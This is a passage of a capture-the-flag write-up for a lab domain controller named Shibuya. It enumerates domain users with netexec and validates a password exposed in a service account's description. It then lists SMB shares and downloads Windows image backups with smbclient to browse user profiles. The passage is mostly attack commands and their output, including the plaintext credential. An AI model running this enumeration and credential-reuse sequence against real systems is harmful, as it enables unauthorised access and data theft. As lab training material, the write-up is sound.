</span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Caroline.Smith 2025-02-16 10:23:49 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Sheila.O'Donnell 2025-02-16 10:23:49 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Jacqueline.Hall 2025-02-16 10:23:49 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Charlene.Hudson 2025-02-16 10:23:49 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Gregory.Smith 2025-02-16 10:23:49 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Billy.Bailey 2025-02-16 10:23:49 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Alison.Ahmed 2025-02-16 10:23:49 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Kerry.Hall 2025-02-16 10:23:49 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Holly.Alexander 2025-02-16 10:23:49 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Paula.Sutton 2025-02-16 10:23:50 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Phillip.Parsons 2025-02-16 10:23:50 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Elizabeth.Adams 2025-02-16 10:23:50 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Connor.Henderson 2025-02-16 10:23:50 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Fiona.Fuller 2025-02-16 10:23:50 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Danny.Brown 2025-02-16 10:23:50 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Carly.Jones 2025-02-16 10:23:50 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Stacey.Jones 2025-02-16 10:23:50 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Joel.Taylor 2025-02-16 10:23:50 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 June.Evans 2025-02-16 10:23:50 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Linda.Pearce 2025-02-16 10:23:50 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Holly.Shaw 2025-02-16 10:23:50 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Carolyn.Hussain 2025-02-16 10:23:50 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Gareth.Davies 2025-02-16 10:23:50 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Charlotte.Wright 2025-02-16 10:23:50 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Georgina.Macdonald 2025-02-16 10:23:50 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Emily.Cook 2025-02-16 10:23:50 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Terence.Richards 2025-02-16 10:23:50 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Aimee.Khan 2025-02-16 10:23:50 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Martin.Lane 2025-02-16 10:23:50 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Roger.Warren 2025-02-16 10:23:50 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Joe.Mann 2025-02-16 10:23:50 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Lydia.Moore 2025-02-16 10:23:50 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Frederick.Gordon 2025-02-16 10:23:50 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Glenn.Shepherd 2025-02-16 10:23:50 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Rita.Smith 2025-02-16 10:23:50 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Edward.Parker 2025-02-16 10:23:51 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Emma.Chamberlain 2025-02-16 10:23:51 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Helen.Harvey 2025-02-16 10:23:51 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Zoe.Dawson 2025-02-16 10:23:51 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Kimberley.Johnson 2025-02-16 10:23:51 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Alexander.Carey 2025-02-16 10:23:51 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Billy.Blackburn 2025-02-16 10:23:51 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Graham.Wallace 2025-02-16 10:23:51 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Lydia.Smith 2025-02-16 10:23:51 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Marian.Stewart 2025-02-16 10:23:51 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Dennis.Williams 2025-02-16 10:23:51 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Kenneth.Shaw 2025-02-16 10:23:51 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Kim.Smith 2025-02-16 10:23:51 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Guy.Russell 2025-02-16 10:23:51 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Amber.Fowler 2025-02-16 10:23:51 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Tracy.O'Sullivan 2025-02-16 10:23:51 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Charlene.Norman 2025-02-16 10:23:51 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Glenn.Bibi 2025-02-16 10:23:51 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Leslie.Holmes 2025-02-16 10:23:51 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Tom.Read 2025-02-16 10:23:51 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Joe.Carter 2025-02-16 10:23:51 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Lisa.Armstrong 2025-02-16 10:23:51 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Matthew.Owen 2025-02-16 10:23:51 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Henry.Howe 2025-02-16 10:23:51 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Carol.Clarke 2025-02-16 10:23:52 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Elizabeth.O'Neill 2025-02-16 10:23:52 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Marc.Davis 2025-02-16 10:23:52 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Leon.Wells 2025-02-16 10:23:52 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Natasha.Lane 2025-02-16 10:23:52 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Bernard.Nelson 2025-02-16 10:23:52 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Hannah.Price 2025-02-16 10:23:52 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Patrick.Thomas 2025-02-16 10:23:52 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Abdul.Clarke 2025-02-16 10:23:52 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Hilary.Murphy 2025-02-16 10:23:52 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Hugh.Higgins 2025-02-16 10:23:52 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Rachel.Foster 2025-02-16 10:23:52 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Alison.Jones 2025-02-16 10:23:52 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Anne.Carr 2025-02-16 10:23:52 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Victoria.Cook 2025-02-16 10:23:52 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Jane.Taylor 2025-02-16 10:23:52 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Karen.Carter 2025-02-16 10:23:52 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Ronald.Lloyd 2025-02-16 10:23:52 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Douglas.Humphreys 2025-02-16 10:23:52 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Louis.Barrett 2025-02-16 10:23:52 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Rhys.Thompson 2025-02-16 10:23:52 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Gareth.Moore 2025-02-16 10:23:52 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Margaret.O'Connor 2025-02-16 10:23:52 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Natalie.Horton 2025-02-16 10:23:52 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Maurice.Curtis 2025-02-16 10:23:52 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Dennis.Bell 2025-02-16 10:23:52 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Antony.Marshall 2025-02-16 10:23:53 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Lewis.Edwards 2025-02-16 10:23:53 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Reece.Young 2025-02-16 10:23:53 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Gary.Parry 2025-02-16 10:23:53 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Andrea.Gray 2025-02-16 10:23:53 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Ann.Reed 2025-02-16 10:23:53 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Robin.Kaur 2025-02-16 10:23:53 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Bethany.Briggs 2025-02-16 10:23:53 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Donald.Coles 2025-02-16 10:23:53 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 Martyn.Turner 2025-02-16 10:23:53 0 </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 </span><span class="netexec-logmessage">[*]</span><span class="go"> Enumerated 503 local users: SHIBUYA </span></code></pre></div></div> <p>The fourth line of output is svc_autojoin, and there’s a non-intelligible string as the description, “K5&amp;A6Dw9d8jrKWhV”.</p> <h3 id="validate-creds">Validate Creds</h3> <p>That string works as creds with <code class="language-plaintext highlighter-rouge">netexec</code> on SMB (with or without <code class="language-plaintext highlighter-rouge">-k</code>):</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec smb shibuya.vl <span class="nt">-u</span> svc_autojoin <span class="nt">-p</span> <span class="s1">'K5&amp;A6Dw9d8jrKWhV'</span> <span class="nt">-k</span> <span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 </span><span class="netexec-logmessage">[*]</span><span class="go"> Windows Server 2022 Build 20348 x64 (name:AWSJPDC0522) (domain:shibuya.vl) (</span><span class="netexec-logsuccess">signing:True</span><span class="go">) (</span><span class="nb">SMBv1:False</span><span class="go">) </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 </span><span class="netexec-logsuccess">[+]</span><span class="go"> shibuya.vl\svc_autojoin:K5&amp;A6Dw9d8jrKWhV </span><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec smb shibuya.vl <span class="nt">-u</span> svc_autojoin <span class="nt">-p</span> <span class="s1">'K5&amp;A6Dw9d8jrKWhV'</span> <span class="netexec-protocol">SMB </span><span class="go"> 10.129.234.42 445 AWSJPDC0522 </span><span class="netexec-logmessage">[*]</span><span class="go"> Windows Server 2022 Build 20348 x64 (name:AWSJPDC0522) (domain:shibuya.vl) (</span><span class="netexec-logsuccess">signing:True</span><span class="go">) (</span><span class="nb">SMBv1:False</span><span class="go">) </span><span class="netexec-protocol">SMB </span><span class="go"> 10.129.234.42 445 AWSJPDC0522 </span><span class="netexec-logsuccess">[+]</span><span class="go"> shibuya.vl\svc_autojoin:K5&amp;A6Dw9d8jrKWhV </span></code></pre></div></div> <p>They don’t work for SSH, but <code class="language-plaintext highlighter-rouge">netexec</code> says they do for RDP:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec ssh shibuya.vl <span class="nt">-u</span> svc_autojoin <span class="nt">-p</span> <span class="s1">'K5&amp;A6Dw9d8jrKWhV'</span> <span class="netexec-protocol">SSH </span><span class="go"> 10.129.234.42 22 shibuya.vl </span><span class="netexec-logmessage">[*]</span><span class="go"> SSH-2.0-OpenSSH_for_Windows_9.5 </span><span class="netexec-protocol">SSH </span><span class="go"> 10.129.234.42 22 shibuya.vl </span><span class="netexec-logfail">[-]</span><span class="go"> svc_autojoin:K5&amp;A6Dw9d8jrKWhV </span><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec rdp shibuya.vl <span class="nt">-u</span> svc_autojoin <span class="nt">-p</span> <span class="s1">'K5&amp;A6Dw9d8jrKWhV'</span> <span class="netexec-protocol">RDP </span><span class="go"> 10.129.234.42 3389 AWSJPDC0522 </span><span class="netexec-logmessage">[*]</span><span class="go"> Windows 10 or Windows Server 2016 Build 20348 (name:AWSJPDC0522) (domain:shibuya.vl) (nla:True) </span><span class="netexec-protocol">RDP </span><span class="go"> 10.129.234.42 3389 AWSJPDC0522 </span><span class="netexec-logsuccess">[+]</span><span class="go"> shibuya.vl\svc_autojoin:K5&amp;A6Dw9d8jrKWh </span></code></pre></div></div> <p>I am not able to get them to connect.</p> <h2 id="shell-as-simonwatson">Shell as simon.watson</h2> <h3 id="smb-shares">SMB Shares</h3> <h4 id="enumerate-access">Enumerate Access</h4> <p>svc_autojoin sees the same shares:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec smb shibuya.vl <span class="nt">-u</span> svc_autojoin <span class="nt">-p</span> <span class="s1">'K5&amp;A6Dw9d8jrKWhV'</span> <span class="nt">--shares</span> <span class="netexec-protocol">SMB </span><span class="go"> 10.129.234.42 445 AWSJPDC0522 </span><span class="netexec-logmessage">[*]</span><span class="go"> Windows Server 2022 Build 20348 x64 (name:AWSJPDC0522) (domain:shibuya.vl) (</span><span class="netexec-logsuccess">signing:True</span><span class="go">) (</span><span class="nb">SMBv1:False</span><span class="go">) </span><span class="netexec-protocol">SMB </span><span class="go"> 10.129.234.42 445 AWSJPDC0522 </span><span class="netexec-logsuccess">[+]</span><span class="go"> shibuya.vl\svc_autojoin:K5&amp;A6Dw9d8jrKWhV </span><span class="netexec-protocol">SMB </span><span class="go"> 10.129.234.42 445 AWSJPDC0522 </span><span class="netexec-logmessage">[*]</span><span class="go"> Enumerated shares </span><span class="netexec-protocol">SMB </span><span class="go"> 10.129.234.42 445 AWSJPDC0522 </span><span class="netexec-shareenum">Share Permissions Remark</span><span class="err"> </span><span class="netexec-protocol">SMB </span><span class="go"> 10.129.234.42 445 AWSJPDC0522 </span><span class="netexec-shareenum">----- ----------- ------ </span><span class="netexec-protocol">SMB </span><span class="go"> 10.129.234.42 445 AWSJPDC0522 </span><span class="netexec-shareenum">ADMIN$ Remote Admin </span><span class="netexec-protocol">SMB </span><span class="go"> 10.129.234.42 445 AWSJPDC0522 </span><span class="netexec-shareenum">C$ Default share </span><span class="netexec-protocol">SMB </span><span class="go"> 10.129.234.42 445 AWSJPDC0522 </span><span class="netexec-shareenum">images$ READ </span><span class="netexec-protocol">SMB </span><span class="go"> 10.129.234.42 445 AWSJPDC0522 </span><span class="netexec-shareenum">IPC$ READ Remote IPC </span><span class="netexec-protocol">SMB </span><span class="go"> 10.129.234.42 445 AWSJPDC0522 </span><span class="netexec-shareenum">NETLOGON READ Logon server share </span><span class="netexec-protocol">SMB </span><span class="go"> 10.129.234.42 445 AWSJPDC0522 </span><span class="netexec-shareenum">SYSVOL READ Logon server share </span><span class="netexec-protocol">SMB </span><span class="go"> 10.129.234.42 445 AWSJPDC0522 </span><span class="netexec-shareenum">users READ </span></code></pre></div></div> <p>The differences is that svc_autojoin can access <code class="language-plaintext highlighter-rouge">images$</code>.</p> <h4 id="spider">Spider</h4> <p>I’ll use <code class="language-plaintext highlighter-rouge">--spider 'images$'</code> to get a file listing of the <code class="language-plaintext highlighter-rouge">images$</code> share (using <code class="language-plaintext highlighter-rouge">--regex .</code> to get all files):</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec smb shibuya.vl <span class="nt">-u</span> svc_autojoin <span class="nt">-p</span> <span class="s1">'K5&amp;A6Dw9d8jrKWhV'</span> <span class="nt">--spider</span> <span class="s1">'images$'</span> <span class="nt">--regex</span> <span class="nb">.</span> <span class="netexec-protocol">SMB </span><span class="go"> 10.129.234.42 445 AWSJPDC0522 </span><span class="netexec-logmessage">[*]</span><span class="go"> Windows Server 2022 Build 20348 x64 (name:AWSJPDC0522) (domain:shibuya.vl) (</span><span class="netexec-logsuccess">signing:True</span><span class="go">) (</span><span class="nb">SMBv1:False</span><span class="go">) </span><span class="netexec-protocol">SMB </span><span class="go"> 10.129.234.42 445 AWSJPDC0522 </span><span class="netexec-logsuccess">[+]</span><span class="go"> shibuya.vl\svc_autojoin:K5&amp;A6Dw9d8jrKWhV </span><span class="netexec-protocol">SMB </span><span class="go"> 10.129.234.42 445 AWSJPDC0522 </span><span class="netexec-logmessage">[*]</span><span class="go"> Started spidering </span><span class="netexec-protocol">SMB </span><span class="go"> 10.129.234.42 445 AWSJPDC0522 </span><span class="netexec-logmessage">[*]</span><span class="go"> Spidering . </span><span class="netexec-protocol">SMB </span><span class="go"> 10.129.234.42 445 AWSJPDC0522 //10.129.234.42/images$/. [dir] </span><span class="netexec-protocol">SMB </span><span class="go"> 10.129.234.42 445 AWSJPDC0522 //10.129.234.42/images$/.. [dir] </span><span class="netexec-protocol">SMB </span><span class="go"> 10.129.234.42 445 AWSJPDC0522 //10.129.234.42/images$/AWSJPWK0222-01.wim [lastm:'2025-02-19 17:35' size:8264070] </span><span class="netexec-protocol">SMB </span><span class="go"> 10.129.234.42 445 AWSJPDC0522 //10.129.234.42/images$/AWSJPWK0222-02.wim [lastm:'2025-02-19 17:35' size:50660968] </span><span class="netexec-protocol">SMB </span><span class="go"> 10.129.234.42 445 AWSJPDC0522 //10.129.234.42/images$/AWSJPWK0222-03.wim [lastm:'2025-02-19 17:35' size:32065850] </span><span class="netexec-protocol">SMB </span><span class="go"> 10.129.234.42 445 AWSJPDC0522 //10.129.234.42/images$/vss-meta.cab [lastm:'2025-02-19 17:35' size:365686] </span><span class="netexec-protocol">SMB </span><span class="go"> 10.129.234.42 445 AWSJPDC0522 </span><span class="netexec-logmessage">[*]</span><span class="go"> Done spidering (Completed in 0.5584118366241455) </span></code></pre></div></div> <h4 id="exfil">Exfil</h4> <p>I’ll connect with <code class="language-plaintext highlighter-rouge">smbclient</code> and save all four files:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">oxdf@hacky$ smbclient -U shibuya.vl/svc_autojoin '//shibuya.vl/images$' Password for [SHIBUYA.VL\svc_autojoin]: Try "help" to get a list of possible commands. </span><span class="gp">smb: \&gt; </span><span class="nb">ls</span> <span class="go"> . D 0 Sun Feb 16 11:24:08 2025 .. DHS 0 Wed Apr 9 00:09:45 2025 AWSJPWK0222-01.wim A 8264070 Sun Feb 16 11:23:41 2025 AWSJPWK0222-02.wim A 50660968 Sun Feb 16 11:23:45 2025 AWSJPWK0222-03.wim A 32065850 Sun Feb 16 11:23:47 2025 vss-meta.cab A 365686 Sun Feb 16 11:22:37 2025 5048575 blocks of size 4096. 1549504 blocks available </span><span class="gp">smb: \&gt; </span>prompt off <span class="gp">smb: \&gt; </span>mget <span class="k">*</span> <span class="go">getting file \AWSJPWK0222-01.wim of size 8264070 as AWSJPWK0222-01.wim (5423.6 KiloBytes/sec) (average 5423.6 KiloBytes/sec) getting file \AWSJPWK0222-02.wim of size 50660968 as AWSJPWK0222-02.wim (4750.7 KiloBytes/sec) (average 4834.8 KiloBytes/sec) getting file \AWSJPWK0222-03.wim of size 32065850 as AWSJPWK0222-03.wim (2711.9 KiloBytes/sec) (average 3789.4 KiloBytes/sec) getting file \vss-meta.cab of size 365686 as vss-meta.cab (759.8 KiloBytes/sec) (average 3729.9 KiloBytes/sec) </span></code></pre></div></div> <h3 id="images">Images</h3> <h4 id="format">Format</h4> <p>The three files are Windows imaging (WIM) images:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>file AWSJPWK0222-0<span class="k">*</span> <span class="go">AWSJPWK0222-01.wim: Windows imaging (WIM) image v1.13, XPRESS compressed, reparse point fixup AWSJPWK0222-02.wim: Windows imaging (WIM) image v1.13, XPRESS compressed, reparse point fixup AWSJPWK0222-03.wim: Windows imaging (WIM) image v1.13, XPRESS compressed, reparse point fixup </span></code></pre></div></div> <p>These are disk images files created by Microsoft.</p> <h4 id="reading-wim">Reading wim</h4> <p>7zip can handle reading the files inside <code class="language-plaintext highlighter-rouge">.wim</code> files. I’ll use <code class="language-plaintext highlighter-rouge">7z l</code> to list the file in each. <code class="language-plaintext highlighter-rouge">AWSJPWK0222-01.wim</code> seems to have a <code class="language-plaintext highlighter-rouge">Users</code> directory, including <code class="language-plaintext highlighter-rouge">Administrator</code>, <code class="language-plaintext highlighter-rouge">simon.watson</code>, <code class="language-plaintext highlighter-rouge">Default</code>, and <code class="language-plaintext highlighter-rouge">Public</code>:</p> <div class="language-console code-collapse highlighter-rouge" data-trunc="800"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>7z l AWSJPWK0222-01.wim <span class="go"> 7-Zip 23.01 (x64) : Copyright (c) 1999-2023 Igor Pavlov : 2023-06-20 64-bit locale=en_US.UTF-8 Threads:12 OPEN_MAX:1024 Scanning the drive for archives: 1 file, 8264070 bytes (8071 KiB) Listing archive: AWSJPWK0222-01.wim -- Path = AWSJPWK0222-01.wim Type = wim WARNING = Some files have incorrect reference count Physical Size = 8264070 Size = 78387563 Packed Size = 8188162 Method = XPress:15 Cluster Size = 32768 Created = 2025-02-16 11:23:41.0431850 Modified = 2025-02-16 11:23:41.0431850 Comment = &lt;WIM&gt;&lt;TOTALBYTES&gt;8263232&lt;/TOTALBYTES&gt;&lt;IMAGE INDEX="1"&gt;&lt;DIRCOUNT&gt;829&lt;/DIRCOUNT&gt;&lt;FILECOUNT&gt;675&lt;/FILECOUNT&gt;&lt;TOTALBYTES&gt;88009447&lt;/TOTALBYTES&gt;&lt;HARDLINKBYTES&gt;0&lt;/HARDLINKBYTES&gt;&lt;CREATIONTIME&gt;&lt;HIGHPART&gt;0x01DB8065&lt;/HIGHPART&gt;&lt;LOWPART&gt;0x3B2D336A&lt;/LOWPART&gt;&lt;/CREATIONTIME&gt;&lt;LASTMODIFICATIONTIME&gt;&lt;HIGHPART&gt;0x01DB8065&lt;/HIGHPART&gt;&lt;LOWPART&gt;0x3B2D336A&lt;/LOWPART&gt;&lt;/LASTMODIFICATIONTIME&gt;&lt;WIMBOOT&gt;0&lt;/WIMBOOT&gt;&lt;NAME&gt;Backup01&lt;/NAME&gt;&lt;/IMAGE&gt;&lt;/WIM&gt; Version = 1.13 Multivolume = - Volume = 1 Volumes = 1 Images = 1 Date Time Attr Size Compressed Name ------------------- ----- ------------ ------------ ------------------------ 2025-02-16 10:48:48 D.... Administrator 2025-02-16 19:48:13 DRH.. Default 2025-02-16 10:48:48 DR... Public 2025-02-16 11:15:52 D.... simon.watson 2025-02-16 10:48:48 DR... Administrator/3D Objects 2025-02-16 10:48:46 D.H.. Administrator/AppData 2025-02-16 10:48:48 DR... Administrator/Contacts 2025-02-16 10:48:48 DR... Administrator/Desktop 2025-02-16 10:48:49 DR... Administrator/Documents 2025-02-16 10:48:48 DR... Administrator/Downloads 2025-02-16 10:48:48 DR... Administrator/Favorites 2025-02-16 10:48:49 DR... Administrator/Links 2025-02-16 10:48:48 DR... Administrator/Music 2025-02-16 10:48:48 DR... Administrator/Pictures 2025-02-16 10:48:49 DR... Administrator/Saved Games 2025-02-16 10:48:49 DR... Administrator/Searches 2025-02-16 10:48:48 DR... Administrator/Videos 2025-02-16 11:14:06 D.... Administrator/AppData/Local 2025-02-16 10:48:49 D.... Administrator/AppData/LocalLow 2025-02-16 10:48:48 D.... Administrator/AppData/Roaming 2025-02-16 10:48:52 D.... Administrator/AppData/Local/ConnectedDevicesPlatform 2025-02-16 11:14:07 D.... Administrator/AppData/Local/Microsoft 2025-02-16 10:49:01 D.... Administrator/AppData/Local/Microsoft_Corporation 2025-02-16 11:11:03 D.... Administrator/AppData/Local/Packages 2025-02-16 11:22:36 D.... Administrator/AppData/Local/Temp 2025-02-16 10:48:52 D.... Administrator/AppData/Local/ConnectedDevicesPlatform/L.Administrator 2025-02-16 10:48:48 D..S. Administrator/AppData/Local/Microsoft/Credentials 2025-02-16 10:48:49 D.... Administrator/AppData/Local/Microsoft/Edge 2025-02-16 10:48:48 D.... Administrator/AppData/Local/Microsoft/Feeds 2025-02-16 10:48:48 D.HS. Administrator/AppData/Local/Microsoft/Feeds Cache 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input 2021-05-08 08:34:49 D.... Administrator/AppData/Local/Microsoft/InputPersonalization 2025-02-16 11:10:30 D.... Administrator/AppData/Local/Microsoft/Internet Explorer 2025-02-16 10:59:25 D.... Administrator/AppData/Local/Microsoft/Media Player 2025-02-16 11:14:07 D.... Administrator/AppData/Local/Microsoft/PenWorkspace 2025-02-16 10:48:48 D.... Administrator/AppData/Local/Microsoft/PlayReady 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/Vault 2025-02-16 10:55:59 D.... Administrator/AppData/Local/Microsoft/Windows 2021-05-08 08:20:26 D.HS. Administrator/AppData/Local/Microsoft/Windows Sidebar 2021-05-08 08:20:24 D..S. Administrator/AppData/Local/Microsoft/WindowsApps 2025-02-16 10:49:00 D.... Administrator/AppData/Local/Microsoft/Edge/User Data 2025-02-16 10:48:49 D.... Administrator/AppData/Local/Microsoft/Edge/User Data/BrowserMetrics 2025-02-16 10:48:49 D.... Administrator/AppData/Local/Microsoft/Edge/User Data/Crashpad 2025-02-16 10:48:49 